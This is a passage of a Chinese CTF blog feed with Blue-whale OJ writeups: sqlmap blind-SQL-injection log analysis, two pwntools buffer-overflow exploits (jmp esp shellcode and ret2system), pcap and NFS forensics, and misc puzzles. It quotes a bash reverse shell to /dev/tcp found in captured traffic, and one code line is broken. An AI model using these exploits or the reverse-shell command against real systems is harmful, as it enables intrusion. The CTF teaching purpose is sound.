title="日志分析"></a>日志分析</h2><p>一开始没看出啥所以然，拖到最后看到了熟悉的二分法盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;64) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;96) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;112) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 182 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;104) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 182 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;100) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;102) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 182 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:53 +0000] &quot;GET /?username=admin&apos; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1),1,1))&gt;101) THEN 0x61646d696e ELSE 0x28 END))-- eYTO&amp;password=b HTTP/1.1&quot; 200 183 &quot;-&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br></pre></td></tr></table></figure><ul><li>二分法思路</li></ul><ol><li>mid为left和right的中间值，mid是否和left相等，相等跳到5，如果不等跳到2</li><li>请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到4</li><li>返回页面正确，将right赋值为mid</li><li>返回页面错误，将left赋值为mid</li><li>返回mid值</li></ol><ul><li>sql语句解析</li></ul><p>RLIKE(),不区分大小写的不完全匹配，此处用来将admin与二分查找后再判断的结果(<code>CASE WHEN ……THEN 0x61646d696e ELSE 0x28 END</code>)进行匹配，如果匹配成功则说明查找语句正确<br>ORD(),返回字符串第一个字符的 ASCII 值,MID()用来提取字符<br>SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM walawala.fl4g ORDER BY flag LIMIT 0,1) 就是在walawala.fl4g库中查找flag，IFNULL函数用于将NULL值替换为另外一个值</p><ul><li>逐个字符分析二分法的结果<br>每次ORD(MID())查询的参数加一，说明查到了一个字符，于是就以之为每个字符的分界。<br>以上面第一个为例，判断第一个字符是否大于64√→是否大于96√→是否大于112×→是否大于104×是否大于100√→是否大于102×→是否大于101<br>经过如上的一系列判断，即可得知第一个字符为f。逐个字符分析即可得到flag。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Log writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day9 pwn</title>
    <link href="https://purewhitywhite.github.io/2020-03-16/Stage1Day9-pwn/"/>
    <id>https://purewhitywhite.github.io/2020-03-16/Stage1Day9-pwn/</id>
    <published>2020-03-16T07:27:39.000Z</published>
    <updated>2020-03-16T13:45:36.792Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>shellcode writeup.</p><a id="more"></a><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="查看文件类型-amp-保护机制"><a href="#查看文件类型-amp-保护机制" class="headerlink" title="查看文件类型&amp;保护机制"></a>查看文件类型&amp;保护机制</h2><center><img src="https://s1.ax1x.com/2020/03/16/8Ynvng.jpg" alt="8Ynvng.jpg" border="0"></center>与第一关不同，没有开启NX（不可执行），此时可以尝试在数据所在内存页写入shellcode<h2 id="反编译结果"><a href="#反编译结果" class="headerlink" title="反编译结果"></a>反编译结果</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804851A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80484EB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello "</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到与第一关一样read函数发生缓冲区溢出，buf大小为0x1Ch，读入了0x100h，可以尝试在执行read函数时写入shellcode。于是问题的关键就在于：如何找到buf在栈中的储存位置（以便修改返回地址指向shellcode）？</p><h2 id="动态调试确定buf在栈中位置"><a href="#动态调试确定buf在栈中位置" class="headerlink" title="动态调试确定buf在栈中位置"></a>动态调试确定buf在栈中位置</h2><ul><li>使用IDA的Remote Linux Debugger实现对pwn3的动态调试<br>step1:将IDA目录\dbgsrv\里的<code>linux_server</code>文件放在linux里pwn3所在的同一目录（若是64位文件则使用<code>linux_server64</code>）</li></ul><p>step2:在linux下运行该文件:<code>./linux_server</code>开始监听<br>step3:在IDA菜单栏→Debugger→switchdebugger中选择linuxdebugger，并完成配置</p><hr><p>在<code>push 0</code>处设置断点，可以看到buf的地址以作为read的参数入栈：<br><center><img src="https://s1.ax1x.com/2020/03/16/8Y8loF.jpg" alt="8Y8loF.jpg" border="0"></center><br>向buf输入“hello”，查看并验证栈中的情况：<br><center><img src="https://s1.ax1x.com/2020/03/16/8YGSfJ.jpg" alt="8YGSfJ.jpg" border="0"></center><br><center><img src="https://s1.ax1x.com/2020/03/16/8YGkm6.jpg" alt="8YGkm6.jpg" border="0"></center><br>可以看到hello已经写入buf地址的栈中（逆序是因为小端序）</p><hr><p>然而再次运行、调试发现buf在栈中的位置并不固定：<br><center><img src="https://s1.ax1x.com/2020/03/16/8YGwXq.jpg" alt="8YGwXq.jpg" border="0"></center></p><h2 id="动态定位shellcode"><a href="#动态定位shellcode" class="headerlink" title="动态定位shellcode"></a>动态定位shellcode</h2><center><img src="https://s1.ax1x.com/2020/03/16/8YJQC4.md.jpg" alt="8YJQC4.jpg" border="0"></center><p>解决方案：利用<code>jmp esp</code>运行shellcode<a href="https://blog.csdn.net/lixiangminghate/article/details/53333710" title="原理解析" target="_blank" rel="noopener">原理解析</a><br>思路：利用任意一个<code>jmp esp</code>指令的地址覆盖返回地址→覆盖buf和ebp→在返回地址之后紧跟着布置shellcode→函数在返回后将被定向去执行内存中的<code>jmp esp</code>指令→<code>jmp esp</code>指令执行后，处理器会到栈区函数返回地址之后的地方取指令执行，即shellcode</p><blockquote><p><code>jmp esp</code>的机器码为FFE4，在文件中的地址为08048667。<br><center><img src="https://s1.ax1x.com/2020/03/16/8YWVfJ.jpg" alt="8YWVfJ.jpg" border="0"></center></p></blockquote><table><tr><td bgcolor="#87CEFA">payload:(0x1ch+0x4h)*a +[jmp esp]+shellcode</td></tr></table><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="number">32</span>*<span class="string">'a'</span> + p32(<span class="number">0x08048667</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><img src="https://s1.ax1x.com/2020/03/16/8Y4bcj.md.jpg" alt="8Y4bcj.jpg" border="0"></center>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;shellcode writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="pwn" scheme="https://purewhitywhite.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day8 Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-15/Stage1Day8-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-15/Stage1Day8-Misc/</id>
    <published>2020-03-15T12:52:46.000Z</published>
    <updated>2020-03-15T15:37:22.493Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Forensics1、Forensics2、Shell writeup.</p><a id="more"></a><h1 id="Forensics1"><a href="#Forensics1" class="headerlink" title="Forensics1"></a>Forensics1</h1><p>根据提示过滤http流量：<br><center><img src="https://s1.ax1x.com/2020/03/15/88hx4H.jpg" alt="88hx4H.jpg" border="0"></center><br>跟踪http流，可知请求与返回的大概流程：<code>打开网页→获取ico→三次输入密码→进入secretpage→获取s3cret.png</code><br>于是将s3cret.png导出分组字节流→修改后缀名为图片格式→获得flag<br><center><img src="https://s1.ax1x.com/2020/03/15/884TIg.jpg" alt="884TIg.jpg" border="0"></center></p><h1 id="Forensics2"><a href="#Forensics2" class="headerlink" title="Forensics2"></a>Forensics2</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><ul><li><p><code>NFS</code>实现了一个跨越网络的文件访问功能，其整个架构为Client-Server架构，客户端和服务端通过<code>RPC</code>协议进行通信，<code>RPC</code>协议可以简单的理解为一个基于TCP的应用层协议，它简化命令和数据的传输。</p><center><img src="https://pic2.zhimg.com/80/v2-796db5ba77a921c6e143553d47cdc251_720w.jpg"></center></li><li><p><code>Mount</code>: 从客户端的角度来说，NFS中的第一个操作称为 mount，Mount 代表将远程文件系统加载到本地文件系统空间中。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>根据题目的hint，优先考虑与文件相关的<code>NFS</code>协议。过滤NFS流量，一番观察后可以看到flag.txt.gz：</p><center><img src="https://s1.ax1x.com/2020/03/15/880NIf.jpg" alt="880NIf.jpg" border="0"></center>继续向下看，双方大概进行了一番认证和目录的搜索，然后就到了用户向服务器写入数据的部分了：<center><img src="https://s1.ax1x.com/2020/03/15/88BjA0.jpg" alt="88BjA0.jpg" border="0"></center></li></ul><p>查看数据包的详细内容，注意到<code>contents</code>部分很有可能含有flag（不过是乱码）：<br><center><a href="https://imgchr.com/i/88DRv4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/15/88DRv4.jpg" alt="88DRv4.jpg" border="0"></a></center><br>注意到这是个压缩文件，于是将其以压缩文件的形式解码，得到flag：<br><img src="https://s1.ax1x.com/2020/03/15/886bTA.jpg" alt="886bTA.jpg" border="0"></p><h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>先看http流量，url为<code>http://192.168.247.130/shell.php?cmd=bash -c &#39;bash -i &gt; /dev/tcp/192.168.247.128/12345 &lt;&amp;1 2&gt;&amp;1&#39;]</code><br>貌似是建立了一个<a href="https://www.cnblogs.com/bmjoker/p/9035217.html" title="反弹shell" target="_blank" rel="noopener">反弹shell</a>，跟踪tcp流量就可看到行为：<br><center><img src="https://s1.ax1x.com/2020/03/15/88Rs91.md.jpg" alt="88Rs91.jpg" border="0"></center></p><p>对于<code>www-data@UbuntuServer16:/tmp/flag$ cat flag.txt | base64 -w 0 | python -c &quot;print raw_input().swapcase()&quot;</code>，再结合下面返回的<code>zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k</code>，说明这就是flag里的内容，不过经过base64编码后再<code>swapcase</code>大小写互换，那么写脚本再改变大小写之后base64解码可得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">code = <span class="string">"zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k"</span></span><br><span class="line">flag = base64.b64decode(code.swapcase())</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;Forensics1、Forensics2、Shell writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day7 pwn</title>
    <link href="https://purewhitywhite.github.io/2020-03-14/Stage1Day7-pwn/"/>
    <id>https://purewhitywhite.github.io/2020-03-14/Stage1Day7-pwn/</id>
    <published>2020-03-14T08:47:23.000Z</published>
    <updated>2020-03-15T15:46:41.429Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>bof writeup.</p><a id="more"></a><h1 id="bof-buffer-overflow"><a href="#bof-buffer-overflow" class="headerlink" title="bof(buffer overflow)"></a>bof(buffer overflow)</h1><h2 id="查看文件类型-amp-保护机制"><a href="#查看文件类型-amp-保护机制" class="headerlink" title="查看文件类型&amp;保护机制"></a>查看文件类型&amp;保护机制</h2><center><img src="https://s1.ax1x.com/2020/03/14/8QTNLT.jpg" alt="8QTNLT.jpg" border="0"></center>可以看到这是一个32位的elf文件，开启了NX保护。<br>checksec检查的保护机制：<ul><li><p>STACKCANNARY(栈保护)：这个选项表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p></li><li><p>NX(DEP)：NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p></li><li><p>PIE（ASLR）：一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br>内存地址随机化机制（address space layout randomization)，有以下三种情况：<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。</p></li><li><p>RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p></li></ul><blockquote><p>reference：<a href="https://bbs.pediy.com/thread-250538.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250538.htm</a></p></blockquote><p>进入IDA查看漏洞部分汇编代码：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">buf= </span><span class="keyword">byte </span>ptr -<span class="number">1</span>Ch</span><br><span class="line"><span class="keyword">push </span>   ebp</span><br><span class="line"><span class="keyword">mov </span>    ebp, esp</span><br><span class="line"><span class="keyword">sub </span>    esp, <span class="number">28</span>h</span><br><span class="line"><span class="comment">; 4:   sub_804851B();</span></span><br><span class="line"><span class="symbol">call</span>    <span class="keyword">sub_804851B</span></span><br><span class="line"><span class="keyword">; </span><span class="number">5</span>:   <span class="keyword">sub_804854A();</span></span><br><span class="line"><span class="keyword">call </span>   <span class="keyword">sub_804854A</span></span><br><span class="line"><span class="keyword">; </span><span class="number">6</span>:   puts(<span class="string">"can you pwn me?"</span>)<span class="comment">;</span></span><br><span class="line"><span class="keyword">sub </span>    esp, <span class="number">0</span>Ch</span><br><span class="line"><span class="keyword">push </span>   offset s        <span class="comment">; "can you pwn me?"</span></span><br><span class="line"><span class="symbol">call</span>    _puts</span><br><span class="line"><span class="comment">; 7:   return read(0, &amp;buf, 0x100u);</span></span><br><span class="line"><span class="keyword">add </span>    esp, <span class="number">10</span>h</span><br><span class="line"><span class="keyword">sub </span>    esp, <span class="number">4</span></span><br><span class="line"><span class="keyword">push </span>   <span class="number">100</span>h            <span class="comment">; nbytes</span></span><br><span class="line"><span class="symbol">lea</span>     eax, [ebp+<span class="keyword">buf]</span></span><br><span class="line"><span class="keyword">push </span>   eax             <span class="comment">; buf</span></span><br><span class="line"><span class="keyword">push </span>   <span class="number">0</span>               <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">call</span>    _read</span><br><span class="line"><span class="keyword">add </span>    esp, <span class="number">10</span>h</span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure><p>结合反编译后结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="几点分析"><a href="#几点分析" class="headerlink" title="几点分析"></a>几点分析</h1><ul><li><p>buf开辟空间大小：1Ch（buf= byte ptr -1Ch）</p></li><li><p>read函数向buf里可写100h字节的数据→<strong>栈溢出</strong></p></li><li><p>参数从右向左入栈+调用方清理栈（每次call之后就add esp,10h）=__cdecl </p><center><img src="https://s1.ax1x.com/2020/03/14/8lSDtP.jpg" alt="8lSDtP.jpg" border="0"></center></li><li><p>栈结构以及调用关系：</p><center><img src="https://s1.ax1x.com/2020/03/14/8lpu38.jpg" alt="8lpu38.jpg" border="0"></center></li><li><p>如何getshell：<code>system(&#39;/bin/sh&#39;);</code></p></li><li><p>system()和/bin/sh位置：</p><center><img src="https://s1.ax1x.com/2020/03/14/8lphKe.jpg" alt="8lphKe.jpg" border="0"></center><center><img src="https://s1.ax1x.com/2020/03/14/8lpoVA.jpg" alt="8lpoVA.jpg" border="0"></center></li><li><p>确定覆盖位数和方法：<br>1ch * <code>a</code>(buf)+4 * <code>a</code>(read()函数ebp)+<code>0804A05C</code>(system()地址)+4 * <code>a</code>(system()的虚拟返回地址)+<code>0804A02C</code>(system()的参数)</p><h1 id="exp-amp-getflag"><a href="#exp-amp-getflag" class="headerlink" title="exp&amp;getflag"></a>exp&amp;getflag</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9990</span>)</span><br><span class="line">system = <span class="number">0x080483F0</span></span><br><span class="line">bin = <span class="number">0x0804A02C</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + p32(system) + <span class="string">'a'</span>*<span class="number">4</span> + p32(bin)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li></ul><center><img src="https://s1.ax1x.com/2020/03/15/885RkF.jpg" alt="885RkF.jpg" border="0"></center>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;bof writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="pwn" scheme="https://purewhitywhite.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day6 Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-13/Stage1Day6-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-13/Stage1Day6-Misc/</id>
    <published>2020-03-13T14:59:03.000Z</published>
    <updated>2020-03-14T08:48:13.310Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Another 01Game、Exif、PkCrack writeup.</p><a id="more"></a><h1 id="Another-01Game"><a href="#Another-01Game" class="headerlink" title="Another 01Game"></a>Another 01Game</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ul><li>0和1的数量很关键，首先统计0和1的数量：</li></ul><p>1369.0/7 = 195.57142857142858<br>1369.0/8 = 171.125<br>1369.0 ** 0.5 = 37.0<br>1369不是7和8的倍数，说明很可能和ASCII没关系。1369是37的平方，说明可以由0和1正好组成一个正方形（二维码，QR code）</p><ul><li>统计字符串长度，可以当作 ASCII 编程解出 flag<br>题目给出的提示非常清晰，下面开始写脚本进行二维码制作+flag获取：<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2></li><li>使用<code>qrcode</code>包进行二维码生成<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line">qr = qrcode.QRCode(</span><br><span class="line">    version=<span class="number">1</span>,</span><br><span class="line">    error_correction=qrcode.constants.ERROR_CORRECT_L,</span><br><span class="line">    box_size=<span class="number">10</span>,</span><br><span class="line">    border=<span class="number">2</span>,</span><br><span class="line">)</span><br><span class="line">qr.add_data(<span class="stringspan>)</span><br><span class="line">qr.make(fit=<span class="number">1</span>)</span><br><span class="line">img = qr.make_image()</span><br><span class="line">img.save(<span class="string">"qr.png"</span>)</span><br><span class="line"><span class="comment"># 扫出来结果貌似一直是它本身，看了半天决定上网上搜一下扫出来的结果。。。如下</span></span><br><span class="line">d = <span class="string">"110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">189</span>, <span class="number">7</span>):</span><br><span class="line">    s = d[i:i+<span class="number">7</span>]</span><br><span class="line">    print(chr(int(s, <span class="number">2</span>)), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></li></ul><h1 id="Exif"><a href="#Exif" class="headerlink" title="Exif"></a>Exif</h1><h2 id="什么是Exif"><a href="#什么是Exif" class="headerlink" title="什么是Exif"></a>什么是Exif</h2><ul><li>可交换图像文件格式（英语：Exchangeable image file format），是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。</li><li>Exif信息是可以被任意编辑的，因此只有参考的功能。</li><li>Exif信息以0xFFE1作为开头标记，后两个字节表示Exif信息的长度。所以Exif信息最大为64 kB，而内部采用TIFF格式。</li><li><a href="https://zh.wikipedia.org/zh-hans/EXIF" title="Exif数据结构" target="_blank" rel="noopener">Exif数据结构</a><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2>使用Exiftool打开图片，可以在<code>Credit</code>中看到一串形似ascii码的数字，查表可得到flag。<center><img src="https://s1.ax1x.com/2020/03/13/8MiuZ9.jpg" alt="8MiuZ9.jpg" border="0"></center></li></ul><h1 id="PkCrack"><a href="#PkCrack" class="headerlink" title="PkCrack"></a>PkCrack</h1><h2 id="已知明文攻击"><a href="#已知明文攻击" class="headerlink" title="已知明文攻击"></a>已知明文攻击</h2><ul><li>大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。<h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2>如图所示，选自被加密的文件和现有的明文，很快便可以生成被加密文件的解密版，打开即可看到flag。<center><img src="https://s1.ax1x.com/2020/03/13/8MFVYt.jpg" alt="8MFVYt.jpg" border="0"></center></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;Another 01Game、Exif、PkCrack writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day5 Web</title>
    <link href="https://purewhitywhite.github.io/2020-03-12/Stage1Day5-Web/"/>
    <id>https://purewhitywhite.github.io/2020-03-12/Stage1Day5-Web/</id>
    <published>2020-03-12T11:38:25.000Z</published>
    <updated>2020-03-12T15:02:41.162Z</updated>
    
